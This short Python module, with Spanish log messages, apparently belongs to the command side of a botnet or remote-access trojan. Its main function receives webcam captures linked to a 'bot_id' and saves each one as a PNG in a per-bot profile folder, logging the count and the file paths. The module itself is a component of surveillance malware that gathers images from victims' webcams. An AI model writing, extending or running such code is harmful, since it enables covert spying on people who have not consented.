from secrets import token_urlsafe
from utils.sys_utils import bytes_convert
from utils.UI import debug

from conf import global_conf

profile = '{}/{}'.format(global_conf.databases['database'], global_conf.databases['profiles'])

def main(result, log, bot_id):

    if (isinstance(result, list)):

        if (len(result) == 0):

            log.logger('¡No se obtuvieron capturas de la webcam!', debug.COM)

        else:

            log.logger('Se obtuvieron %d capturas de la webcam' % (len(result)), debug.PER) if (len(result) > 1) else log.logger('Se obtuvo 1 captura de la webcam', debug.PER)

            for _ in result:

                filename = '{}/{}/{}.webcam.png'.format(profile, bot_id, token_urlsafe(32))

                with open(filename, 'wb') as file_object:

                    file_object.write(bytes_convert.convert(_))

                log.logger('Guardado: "{}"'.format(filename), debug.PER)

    else:

        log.logger('El tipo de dato de los resultados de la captura de la webcam no son correctos', debug.WAR)
